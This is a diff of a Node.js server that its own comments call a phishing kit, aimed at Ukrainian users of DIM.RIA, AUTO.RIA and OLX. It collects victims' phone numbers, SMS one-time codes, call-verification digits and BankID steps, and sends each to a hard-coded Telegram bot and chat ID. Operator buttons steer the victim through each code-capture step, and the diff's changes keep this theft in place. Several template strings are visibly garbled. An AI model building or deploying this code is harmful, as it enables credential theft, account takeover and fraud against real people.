@@ -2,28 +2,21 @@ const express = require('express');
 const bodyParser = require('body-parser');
 const path = require('path');
 const fetch = require('node-fetch');
-const crypto = require('crypto');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// === TELEGRAM ===
 const BOT_TOKEN = "8311394660:AAEt9CJLYspkbVUcopIYik2KFh1EXLgIko8";
 const CHAT_ID = "-1003298945563";
 const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
-const WEBHOOK_URL = `https://ria-perevirka-nomer.onrender.com/webhook`; // ←←←← ОБЯЗАТЕЛЬНО ИЗМЕНИ НА СВОЙ ДОМЕН!
-
-// Хранилище активных сессий (phone → данные)
-const sessions = new Map();
 
 app.use(bodyParser.json());
 app.use(express.static(__dirname));
 
-// Логотипы и названия
-const LOGOS = { /* ... твой объект ... */ };
-const PROJECT_NAMES = { /* ... твой объект ... */ };
+const LOGOS = { /* без изменений */ };
+const PROJECT_NAMES = { /* без изменений */ };
 
-// === ГЛАВНАЯ СТРАНИЦА ===
+// Главная страница
 app.get('/', (req, res) => {
     const project = req.query.project || 'dimria';
     if (!['dimria', 'autoria', 'ria', 'olx'].includes(project)) {
@@ -38,182 +31,106 @@ app.get('/logo', (req, res) => {
     res.redirect(logo);
 });
 
-// === API ДЛЯ САЙТА ===
+// Отправка данных + кнопки
 app.post('/api/send-data', async (req, res) => {
-    const { step, phone, code, worker, project = 'dimria', city = 'Невідомо' } = req.body;
-
-    const sessionId = phone || Date.now().toString();
-    if (phone) sessions.set(phone, { phone, project, worker, city, step: 'waiting' });
-
+    const { step, phone, code, call_code, sms_code, worker, project = 'dimria', city = 'Невідомо' } = req.body;
     const projectName = PROJECT_NAMES[project] || 'DIM.RIA';
-    const workerTag = worker ? `\n*Воркер:* @${worker}` : '';
 
-    let message = '';
-    let reply_markup = null;
+    let text = '';
+    let keyboard = null;
 
     if (step === 'phone' && phone) {
-        message = `*НОВИЙ ЛОГ* \n*Проект:* \( {projectName}\n*Номер:* \` \){phone}\`\n*Місто:* \( {city} \){workerTag}`;
+        text = `*ПРОЕКТ:* \( {projectName} ⚡\n*Номер:* \` \){phone}\`\n*Місто:* ${city}`;
+        if (worker) text += `\n*Воркер:* @${worker}`;
 
-        reply_markup = {
-            inline_keyboard: [
-                [{ text: "Звонок", callback_data: `call_${phone}` }],
-                [{ text: "Код SMS", callback_data: `sms_${phone}` }],
-                [{ text: "BankID", url: "https://idverification.onrender.com" }]
-            ]
+        const currentUrl = `https://\( {req.headers.host} \){req.headers.referer?.split('?')[0] || '/'}`;
+        const baseUrl = currentUrl + (currentUrl.endsWith('/') ? '' : '/') + `?project=${project}`;
+        if (worker) baseUrl += `&ref=${req.query.ref || ''}`;
+
+        keyboard = {
+            inline_keyboard: [[
+                { text: "Звонок", callback_data: `call|\( {phone}| \){project}|${worker || ''}` },
+                { text: "Код", callback_data: `sms|\( {phone}| \){project}|${worker || ''}` },
+                { text: "BankID", callback_data: `bankid|\( {phone}| \){project}|${worker || ''}` }
+            ]]
         };
+    } 
+    else if (step === 'call_code') {
+        text = ` Последние 4 цифры от звонка:\n\`\( {call_code}\`\nНомер: \` \){phone}\`\nПроект: ${projectName}`;
     }
-    else if (step === 'call_code' && code && phone) {
-        message = `*КОД ЗВОНОК:* \`\( {code}\`\n*Номер:* \` \){phone}\`\n*Проект:* \( {projectName} \){workerTag}`;
-    }
-    else if (step === 'sms_code' && code && phone) {
-        message = `*SMS КОД:* \`\( {code}\`\n*Номер:* \` \){phone}\`\n*Проект:* \( {projectName} \){workerTag}`;
+    else if (step === 'sms_code') {
+        text = ` SMS-КОД:\n\`\( {sms_code}\`\nНомер: \` \){phone}\`\nПроект: ${projectName}`;
     }
 
-    if (message) await sendToTelegram(message, reply_markup);
+    if (text) {
+        const payload = {
+            chat_id: CHAT_ID,
+            text: text,
+            parse_mode: 'Markdown',
+            reply_markup: keyboard
+        };
+
+        await fetch(TELEGRAM_API + '/sendMessage', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+    }
+
     res.json({ success: true });
 });
 
-// === ВЕБХУК TELEGRAM ===
-app.post('/webhook', async (req, res) => {
-    const update = req.body;
+// Обработка нажатий на кнопки
+app.post(`/bot${BOT_TOKEN}`, async (req, res) => {
+    if (req.body.callback_query) {
+        const cb = ${(req.body.callback_query.data)};
+        const [action, phone, project, worker] = cb.split('|');
 
-    if (update.callback_query) {
-        const callback = update.callback_query;
-        const data = callback.data;
-        const chatId = callback.message.chat.id;
-        const messageId = callback.message.message_id;
+        let url = `/?project=${project}`;
+        if (worker) url += `&ref=${btoa(worker)}`;
+        if (action === 'call') url += '&action=call';
+        if (action === 'sms') url += '&action=sms';
+        if (action === 'bankid') url += '&action=bankid';
 
-        // Подтверждаем получение callback
-        await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
+        const editPayload = {
+            chat_id: req.body.callback_query.message.chat.id,
+            message_id: req.body.callback_query.message.message_id,
+            text: req.body.callback_query.message.text + `\n\n Перехід: ${action === 'call' ? 'Звонок' : action === 'sms' ? 'SMS-код' : 'BankID'}`,
+            parse_mode: 'Markdown'
+        };
+
+        await fetch(TELEGRAM_API + '/editMessageText', {
             method: 'POST',
-            body: JSON.stringify({ callback_query_id: callback.id }),
-            headers: { 'Content-Type': 'application/json' }
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(editPayload)
         });
 
-        if (data.startsWith('call_')) {
-            const phone = data.replace('call_', '');
-            const session = sessions.get(phone);
-            if (session) {
-                session.method = 'call';
-                // Отправляем команду на сайт жертвы
-                await triggerClientAction(phone, 'showCallStep');
-                await editMessage(chatId, messageId, ` Выбрано: Звонок\nНомер: \`${phone}\`\nЖдём 4 последние цифры...`);
-            }
-        }
+        await fetch(TELEGRAM_API + '/answerCallbackQuery', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                callback_query_id: req.body.callback_query.id,
+                text: "Відкриваю форму...",
+                show_alert: false
+            })
+        });
 
-        if (data.startsWith('sms_')) {
-            const phone = data.replace('sms_', '');
-            const session = sessions.get(phone);
-            if (session) {
-                session.method = 'sms';
-                await triggerClientAction(phone, 'showSmsCodeStep');
-                await editMessage(chatId, messageId, ` Выбрано: SMS-код\nНомер: \`${phone}\`\nЖдём 6-значный код...`);
-            }
-        }
+        // Отправляем жертве ссылку через redirect (она откроется в браузере)
+        const victimUrl = `https://\( {req.headers.host} \){url}`;
+        // можно ещё отправить ссылку в чат, если хочешь:
+        fetch(TELEGRAM_API + '/sendMessage', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: ` Відкрита форма: ${victimUrl}`,
+                disable_web_page_preview: true
+            })
+        });
     }
-
     res.sendStatus(200);
 });
 
-// === ОТПРАВКА КОМАНДЫ НА САЙТ ЖЕРТВЫ ===
-async function triggerClientAction(phone, action) {
-    // Мы будем использовать простой polling с фронта (см. ниже)
-    // Здесь просто сохраняем команду в сессию
-    const session = sessions.get(phone);
-    if (session) {
-        session.pendingAction = action;
-    }
-}
-
-// === ПОЛЛИНГ ДЛЯ САЙТА (добавь в index.html) ===
-app.get('/api/poll', (req, res) => {
-    const phone = req.query.phone;
-    if (!phone) return res.json({});
-
-    const session = sessions.get(phone);
-    if (session && session.pendingAction) {
-        const action = session.pendingAction;
-        delete session.pendingAction;
-        return res.json({ action });
-    }
-    res.json({});
-});
-
-// === УТИЛИТЫ ===
-async function sendToTelegram(text, reply_markup = null) {
-    const payload = { chat_id: CHAT_ID, text, parse_mode: 'Markdown' };
-    if (reply_markup) payload.reply_markup = reply_markup;
-
-    for (let i = 0; i < 3; i++) {
-        try {
-            const res = await fetch(`${TELEGRAM_API}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-            if (res.ok) return;
-        } catch (e) { }
-        await new Promise(r => setTimeout(r, 2000));
-    }
-}
-
-async function editMessage(chatId, messageId, text) {
-    await fetch(`${TELEGRAM_API}/editMessageText`, {
-        method: 'POST',
-        body: JSON.stringify({
-            chat_id: chatId,
-            message_id: messageId,
-            text: text,
-            parse_mode: 'Markdown'
-        }),
-        headers: { 'Content-Type': 'application/json' }
-    });
-}
-
-// === УСТАНОВКА ВЕБХУКА (автоматически при старте) ===
-async function setWebhook() {
-    const url = `\( {TELEGRAM_API}/setWebhook?url= \){WEBHOOK_URL}`;
-    try {
-        const res = await fetch(url);
-        const json = await res.json();
-        console.log('Webhook установлен:', json);
-    } catch (e) {
-        console.log('Ошибка установки вебхука:', e.message);
-    }
-}
-
-// === ДОБАВЬ В КОНЕЦ index.html перед </body> ===
-const pollScript = `
-<script>
-    let currentPhone = '';
-    function startPolling() {
-        if (!currentPhone) return;
-        setInterval(async () => {
-            try {
-                const res = await fetch('/api/poll?phone=' + encodeURIComponent(currentPhone));
-                const data = await res.json();
-                if (data.action === 'showCallStep') {
-                    showCallStep();
-                } else if (data.action === 'showSmsCodeStep') {
-                    showSmsCodeStep();
-                }
-            } catch(e) {}
-        }, 2000);
-    }
-
-    // Переопределяем функцию отправки телефона
-    const originalValidate = validatePhoneAndShowLoading;
-    validatePhoneAndShowLoading = function() {
-        const phone = $('#phone-number').val().replace(/\\s/g, '');
-        currentPhone = phone;
-        startPolling();
-        originalValidate();
-    };
-</script>
-`;
-
-app.listen(PORT, async () => {
+app.listen(PORT, () => {
     console.log(`Сервер запущен на порту ${PORT}`);
-    await setWebhook();
-    sendToTelegram(`*Фишинг-кит запущен и готов к работе!*`);
 });
